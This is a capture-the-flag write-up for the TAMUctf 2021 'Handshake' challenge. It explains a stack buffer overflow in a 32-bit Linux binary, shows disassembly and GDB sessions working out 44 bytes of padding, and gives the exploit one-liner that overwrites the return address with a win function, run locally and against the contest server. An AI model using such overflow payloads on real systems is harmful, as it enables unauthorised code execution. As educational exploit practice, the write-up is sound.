---
title: "TAMUctf 2021 Handshake Solution"
slug: "handshake-writeup"
date: "2021-04-26 11:39:00.000000"
author_name: "Javantea"
author_email: "jvoss@altsci.com"
draft: false
toc: false
images:
---

TAMUctf 2021
[Handshake](https://ctftime.org/task/15794) - 150 points

>    Attack this binary and get the flag!
>    [handshake](http://tamuctf.com/static-files/handshake)
>    `openssl s_client -connect tamuctf.com:443 -servername handshake -quiet`

Handshake is a standard i686 Linux binary with NX but no PIE. There's a stack buffer overflow which is easy enough to exploit. Without PIE, ROP is available. Because Handshake provides a `win` function, it makes sense that is the way to get the flag without getting full code execution with a ROP chain.

I used GDB to find the correct offset, besides that I could have just exploited the binary straight without using GDB at all. The problem I had trying to find the right amount of padding was that I couldn't quite count the stack size. Let's do it now.

```asm
 80492cb: PUSH EBP
 80492cc: MOV EBP, ESP ; EBP = ESP; 
 80492ce: PUSH EBX
 80492cf: SUB ESP, 0x24 ; ESP -= 0x24; 
```

4 bytes for PUSH EBP. 4 bytes for PUSH EBX. 0x24 bytes for SUB ESP, 0x24. How many is that? 0x2c. So we need 44 bytes of padding. That's it. That's the whole thing.

```
(gdb) run <hs_a.txt 
Starting program: /home/angr/handshake <hs_a.txt
Whats the secret handshake? 
That isn't correct!  You aren't supposed to be here. 

Program received signal SIGSEGV, Segmentation fault.
0x0804a020 in ?? ()

...

(gdb) b *0x804931d
Breakpoint 1 at 0x804931d

(gdb) run
Starting program: /home/angr/handshake <hs_a.txt
Whats the secret handshake? 
...
Breakpoint 1, 0x0804931d in vuln ()
(gdb) si
0x08049333 in main ()
(gdb) i r esp
esp            0xffffd5a0          0xffffd5a0
(gdb) x/10wx $esp
0xffffd5a0:     0x00000001      0x080490b0      0x00000000      0xf7dc1905
0xffffd5b0:     0x00000001      0xffffd654      0xffffd65c      0xffffd5e4
0xffffd5c0:     0xffffd5f4      0xf7ffdb78
(gdb) x/10wx $esp-4
0xffffd59c:     0x08049333      0x00000001      0x080490b0      0x00000000
0xffffd5ac:     0xf7dc1905      0x00000001      0xffffd654      0xffffd65c
0xffffd5bc:     0xffffd5e4      0xffffd5f4
(gdb) x/10wx $esp-8
0xffffd598:     0xffffd500      0x08049333      0x00000001      0x080490b0
0xffffd5a8:     0x00000000      0xf7dc1905      0x00000001      0xffffd654
0xffffd5b8:     0xffffd65c      0xffffd5e4
(gdb) x/10wx $esp-12
0xffffd594:     0x080491c2      0xffffd500      0x08049333      0x00000001
0xffffd5a4:     0x080490b0      0x00000000      0xf7dc1905      0x00000001
0xffffd5b4:     0xffffd654      0xffffd65c
(gdb) x/10wx $esp-16
0xffffd590:     0x41414141      0x080491c2      0xffffd500      0x08049333
0xffffd5a0:     0x00000001      0x080490b0      0x00000000      0xf7dc1905
0xffffd5b0:     0x00000001      0xffffd654

```

```sh
echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc2\x91\x04\x08' |./handshake 
Whats the secret handshake? 
Correct! this is a flag and stuff =]

Segmentation fault


(echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc2\x91\x04\x08'; cat) |openssl s_client -connect tamuctf.com:443 -servername handshake -quiet
depth=0 CN = hulkcybr1
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = hulkcybr1
verify return:1
Whats the secret handshake? 
Correct! gigem{r37urn_c0n7r0l1337}

```

The flag is `gigem{r37urn_c0n7r0l1337}`

